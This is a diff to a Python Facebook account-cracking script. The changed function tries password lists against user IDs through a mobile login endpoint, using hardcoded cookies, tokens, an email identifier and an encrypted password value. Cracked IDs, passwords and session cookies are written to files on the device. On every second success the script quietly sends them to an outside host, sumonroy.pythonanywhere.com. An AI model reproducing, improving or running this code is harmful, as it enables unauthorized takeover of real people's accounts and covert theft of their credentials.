@@ -1738,64 +1738,127 @@ def freeq(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M6) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
+            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
-            data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '060331_lb2E',
-            'lgnjs': '1751375011',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
-            'locale': 'hi_IN',
-            'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-            'guid': 'f13465d1007fbcb28',
-            'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            free_fb = Session.get('https://m.facebook.com/').text
             cookies = {
-            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
-            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
+            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
+            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
             'ps_l': '1',
             'ps_n': '1',
-            'locale': 'hi_IN',
-            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
-            'wd': '885x751',}
+            'vpd': 'v1%3B754x393x2.75',
+            'locale': 'en_US',
+            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
+            'dpr': '3.0234789848327637',
+            'm_pixel_ratio': '2.75',
+            'wd': '393x895',
+            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
+            params = {
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'type': 'action',
+            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
+            data = {
+    'av': '0',
+    '__user': '0',
+    '__a': '1',
+    '__req': '7',
+    '__hs': '20294.HYP:comet_plat_default_pkg.2.1...0',
+    'dpr': '1',
+    '__ccg': 'GOOD',
+    '__rev': '1025144028',
+    '__s': '9i0mpn:tl7b2z:wtg4vs',
+    '__hsi': '7530975347099937606',
+    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK5o4q0HU1IEGdwtU2ewbS1Lwqo15E6O1FwlU6KaxyU5N90HwtU5K0UEhwjE',
+    '__csr': 'g_8AltPmJcACp2qAarSaXyp8mKSGhbKJ2Vf-Hypp7GmiBO5lG8BC8CiuiB9btqaKBcIWGdyoKE8EcoaGwSyU8Uixmi5ESu487i3W2C-7E4-10yVooU2iwHwkGwnUaUb8iGA2e0Mo3MxicwkU2kw4Aw4Bwq8coy2u0-E2vxm0137UjgoQU08yS00jNO8G00OK8K09Nw1Jaaw7uzy0hU05P60cvw0ETo',
+    '__hsdp': 'gyxWxW43AIR1gOzQH88hUCUEk8yVah4Je6org-222SbUcU5y2OdyE0Ia3F2E1fUG3ma8PZ8w-q2y7Q5U460BU1f83Exe0NE0_C04DE2ow1E60X40bsxki0BC1Qw1nq04mo0oow2GU11E0qkw0EUw3i80xK09Pw',
+    '__hblp': '01SK05Bo0Du02XC0cswcC0bzw3XU0Uq0xo2nw1d61Jwg85C0lq3C0M811E0LG0uW0qG06OU0PG362u0l2mU5C1qw4gw77wkU0De',
+    '__sjsp': 'gyxWxW43AIR1gMiiIwx7yryxgybAF4iQUpxJ3U88boLwPwm8b8Saw2MEeAaw4_yEdoEzeQC49E4x1u11w9u0jO0W8jwcq029y0C80tKg0JO5h82mo7i05tE',
+    '__comet_req': '1',
+    'lsd': 'AVoTljilr8Y',
+    'jazoest': '21032',
+    '__spin_r': '1025144028',
+    '__spin_b': 'trunk',
+    '__spin_t': '1753441837',
+    'fb_api_caller_class': 'RelayModern',
+    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
+    'variables': {
+        "input": {
+            "client_mutation_id": "1",
+            "actor_id": "0",
+            "app": "facebook",
+            "auth_domain_data_key": None,
+            "caa_login_request_extra_info": {
+                "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////ffAFAA",
+                "shared_prefs_data": "eyIzMDAwMCI6W3sidCI6MTc1MzQ0MTg1Ni42NDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XS...",
+                "cuid": "",
+                "guid": "ffed65de4275edc5a",
+                "jazoest": "21110",
+                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=",
+                "lgnjs": "1753441856",
+                "lgnrnd": "041037_s_DL",
+                "locale": "en_GB",
+                "login_source": "comet_headerless_login",
+                "lsd": "AVoTljildzs",
+                "next": "",
+                "prefill_contact_point": "",
+                "prefill_source": "",
+                "prefill_type": "",
+                "skstamp": "",
+                "timezone": "-330"
+            },
+            "credential_type": "password",
+            "enc_password": {
+                "sensitive_string_value": "#PWD_BROWSER:5:1753441883:AStQAHI2bGOEs4UZ5ZGtnnFDthRlH6gT14bbSE2GuReIdR0u/MGlUtocWxnAMdj/cr8FgAFIi+VSm32S7Pg42SI1B+fK7Ib0LX7dh5+A/56dh2fsuWSWrLqlq0J85M/B5c7/b2iJq/PE4nttRpA="
+            },
+            "event_request_id": "fccafc56-7793-475a-82b0-79126c38dc00",
+            "identifier": "sumonssb9@outlook.com",
+            "ig_web_device_id": None,
+            "initial_request_id": "1",
+            "lids": None,
+            "login_source": "COMET_HEADERLESS_LOGIN",
+            "next": None,
+            "password": {
+                "sensitive_string_value": "#PWD_BROWSER:5:1753441883:AStQAHI2bGOEs4UZ5ZGtnnFDthRlH6gT14bbSE2GuReIdR0u/MGlUtocWxnAMdj/cr8FgAFIi+VSm32S7Pg42SI1B+fK7Ib0LX7dh5+A/56dh2fsuWSWrLqlq0J85M/B5c7/b2iJq/PE4nttRpA="
+            },
+            "persistent": True,
+            "trusted_device_records": "{}",
+            "waterfall_id": "573eeb24-e791-4463-8ccd-00052da7c549"
+        },
+        "scale": 1
+    },
+    'server_timestamps': 'true',
+    'doc_id': '24540252778892185'
+}
             headers = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            'Host': 'mtouch.facebook.com',
+            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+            'x-response-format': 'JSONStream',
             'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
-            'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'viewport-width': '360',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://mtouch.facebook.com',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-            'viewport-width': '885',}
+            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            url = "https://m.facebook.com/async/wbloks/fetch/"
+            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1803,21 +1866,16 @@ def freeq(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
